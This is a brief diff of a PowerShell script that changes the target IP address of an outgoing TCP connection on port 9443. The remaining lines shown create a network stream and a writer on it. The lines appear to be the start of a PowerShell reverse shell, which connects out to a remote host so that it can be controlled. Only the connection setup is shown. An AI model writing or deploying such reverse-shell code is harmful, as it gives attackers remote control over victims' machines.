@@ -1,4 +1,4 @@
-﻿$client = New-Object System.Net.Sockets.TCPClient('137.1.1.144', 9443);
+﻿$client = New-Object System.Net.Sockets.TCPClient('137.1.1.44', 9443);
 $stream = $client.GetStream();
 $writer = New-Object System.IO.StreamWriter($stream);
 $writer.AutoFlush = $true;
